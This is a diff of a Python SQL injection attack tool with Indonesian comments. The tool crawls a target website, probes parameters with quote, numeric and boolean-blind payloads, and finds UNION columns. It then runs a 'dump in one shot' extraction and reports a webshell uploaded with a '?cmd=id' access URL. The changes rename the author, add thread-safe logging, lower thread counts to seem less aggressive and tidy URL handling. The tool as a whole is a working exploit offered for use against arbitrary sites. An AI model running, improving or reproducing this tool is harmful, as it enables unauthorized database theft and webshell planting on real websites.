@@ -2,9 +2,9 @@
 # -*- coding: utf-8 -*-
 
 # --[MAI]--
-# Author: JunedXsec
+# Author: fanky
 # Inspired By: sqlmap, muani injection tools, psql-pro
-# Version: 4.0 (2026) - Professional Release
+# Version: 4.1 (2026) - Professional Stable
 
 import sys
 import os
@@ -15,6 +15,7 @@ import urllib.parse
 from html.parser import HTMLParser
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import OrderedDict
+import threading
 
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -23,7 +24,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 # ==================== KONFIGURASI ====================
 TIMEOUT = 15
 DELAY = 0.5
-MAX_THREADS = 3
+MAX_THREADS = 2                # Kurangi agar tidak terlalu agresif
 MAX_COLUMNS = 30
 RETRY_COUNT = 2
 
@@ -44,18 +45,25 @@ C = {
     'CYAN': '\033[96m'
 }
 
+# Lock untuk output agar tidak kacau saat multi-thread
+print_lock = threading.Lock()
+
+def safe_print(msg):
+    with print_lock:
+        print(msg)
+
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
 
-def log_info(msg): print(f"{C['INFO']}[INFO]{C['RESET']} {msg}")
-def log_error(msg): print(f"{C['ERROR']}[ERROR]{C['RESET']} {msg}")
-def log_success(msg): print(f"{C['SUCCESS']}[SUCCESS]{C['RESET']} {msg}")
-def log_warning(msg): print(f"{C['WARNING']}[WARNING]{C['RESET']} {msg}")
+def log_info(msg): safe_print(f"{C['INFO']}[INFO]{C['RESET']} {msg}")
+def log_error(msg): safe_print(f"{C['ERROR']}[ERROR]{C['RESET']} {msg}")
+def log_success(msg): safe_print(f"{C['SUCCESS']}[SUCCESS]{C['RESET']} {msg}")
+def log_warning(msg): safe_print(f"{C['WARNING']}[WARNING]{C['RESET']} {msg}")
 def log_banner():
-    print(f"{C['BOLD']}{C['CYAN']}--[MAI]--{C['RESET']}")
-    print(f"{C['BOLD']}Author: JunedXsec{C['RESET']}")
-    print(f"Inspired By: sqlmap, muani injection tools, psql-pro")
-    print()
+    safe_print(f"{C['BOLD']}{C['CYAN']}--[MAI]--{C['RESET']}")
+    safe_print(f"{C['BOLD']}Author: JunedXsec{C['RESET']}")
+    safe_print("Inspired By: sqlmap, muani injection tools, psql-pro")
+    safe_print()
 
 # ==================== HTTP HELPER ====================
 session = requests.Session()
@@ -86,8 +94,8 @@ class SmartParser(HTMLParser):
     def __init__(self, base_url):
         super().__init__()
         self.base_url = base_url
-        self.links = []      # semua URL
-        self.forms = []      # (action, method, inputs)
+        self.links = []
+        self.forms = []
         self.params_found = set()
     def handle_starttag(self, tag, attrs):
         attrs = dict(attrs)
@@ -95,7 +103,6 @@ class SmartParser(HTMLParser):
             href = attrs['href']
             full = urllib.parse.urljoin(self.base_url, href)
             self.links.append(full)
-            # cek apakah URL memiliki parameter
             if '?' in full:
                 parsed = urllib.parse.urlparse(full)
                 if parsed.query:
@@ -118,7 +125,6 @@ def extract_params_from_url(url):
     return {}
 
 def discover_endpoints(target):
-    """Crawling halaman utama + follow link sampai depth 1"""
     log_info(f"Memulai Scanning SQLi Vuln Ke Site: {target}")
     resp = fetch(target)
     if not resp or resp.status_code != 200:
@@ -127,7 +133,6 @@ def discover_endpoints(target):
     parser = SmartParser(target)
     parser.feed(resp.text)
     
-    # Kumpulkan semua endpoint GET dari link yang ditemukan
     get_endpoints = []
     seen_urls = set()
     for link in parser.links:
@@ -135,23 +140,20 @@ def discover_endpoints(target):
         if params and link not in seen_urls:
             seen_urls.add(link)
             get_endpoints.append((link, params))
-    # Tambahkan juga URL target asli jika memiliki parameter
+    # Target asli jika punya parameter
     orig_params = extract_params_from_url(target)
     if orig_params and target not in seen_urls:
         get_endpoints.insert(0, (target, orig_params))
     
-    # Form POST
     post_forms = [(action, method, inputs) for action, method, inputs in parser.forms if method == 'post' and inputs]
-    
     log_info(f"Ditemukan {len(get_endpoints)} URL dengan parameter")
     if parser.params_found:
-        log_info(f"Nama parameter yang ditemukan: {', '.join(list(parser.params_found)[:5])}")
+        log_info(f"Nama parameter: {', '.join(list(parser.params_found)[:5])}")
     return get_endpoints, post_forms
 
 # ==================== INJECTION DETECTION ====================
 def test_injection(url, param, orig_value, original_content):
     log_info("Mencari Metode Injection Di Website string_based/numeric_based")
-    # Test single quote
     test_payload = "'"
     log_info(f"Menggunakan Payload: {urllib.parse.quote(test_payload)}")
     params = {param: f"{orig_value}{test_payload}"}
@@ -159,14 +161,12 @@ def test_injection(url, param, orig_value, original_content):
     if resp and resp.status_code == 200 and resp.text != original_content:
         log_info("tipeinjeksi Menggunakan Metode String Based")
         return "string", "'"
-    # Test numeric
     test_payload2 = " AND 1=2"
     params2 = {param: f"{orig_value}{test_payload2}"}
     resp2 = fetch(url, params=params2)
     if resp2 and resp2.status_code == 200 and resp2.text != original_content:
         log_info("tipeinjeksi Menggunakan Metode Numeric Based")
         return "numeric", ""
-    # Test boolean blind
     true_payload = f"{orig_value}' AND '1'='1"
     false_payload = f"{orig_value}' AND '1'='2"
     r_true = fetch(url, params={param: true_payload})
@@ -207,7 +207,10 @@ def union_extract(url, param, original_value, inj_type, trigger, num_cols):
         if found:
             visible = list(OrderedDict.fromkeys(found))
             log_info(f"Angka Yang Muncul: {', '.join(visible)}")
-            payload_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+            # Buat URL payload untuk ditampilkan (perbaiki duplikasi)
+            parsed = urllib.parse.urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            payload_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
             log_info(f"Payload Union: {payload_url}")
             return True
     return False
@@ -235,7 +238,10 @@ def upload_dios(url, param, original_value, inj_type, trigger, num_cols):
         log_info("Mengecek Output respon")
         if resp and "error" not in resp.text.lower():
             log_info("Output Berhasil Di Periksa")
-            log_success(f"Dios: {url}?{param}={urllib.parse.quote(payload)}")
+            parsed = urllib.parse.urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            dios_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
+            log_success(f"Dios: {dios_url}")
             log_success(f"Webshell uploaded to {out_path}")
             log_warning(f"Akses: {out_path}?cmd=id")
             return True
@@ -260,7 +266,7 @@ def scan_endpoint(url, params_dict):
         log_info(f"Jumlah Column: {num_cols}")
         if union_extract(url, param, orig_val, inj_type, trigger, num_cols):
             upload_dios(url, param, orig_val, inj_type, trigger, num_cols)
-        break
+        break  # cukup satu parameter rentan per URL
 
 # ==================== MAIN ====================
 def main():
@@ -270,13 +276,12 @@ def main():
     if not raw_target:
         log_error("URL tidak boleh kosong")
         sys.exit(1)
-    # Bersihkan URL: hapus karakter aneh, pastikan format
-    target = raw_target.split()[0]  # ambil kata pertama jika ada spasi
+    # Bersihkan URL
+    target = raw_target.split()[0]
     if not target.startswith(('http://','https://')):
         target = 'http://' + target
-    # Validasi sederhana
-    if target.endswith(')'):
-        target = target[:-1]
+    # Hapus tanda kurung atau karakter aneh di akhir
+    target = re.sub(r'[)\]}>]+$', '', target)
     
     get_endpoints, post_forms = discover_endpoints(target)
     if not get_endpoints and not post_forms:
@@ -293,6 +298,7 @@ def main():
             except Exception as e:
                 log_error(f"Thread error: {e}")
     
+    # POST forms simple test
     for action, method, inputs in post_forms:
         log_info(f"Mencoba POST form: {action}")
         for field in inputs[:2]:
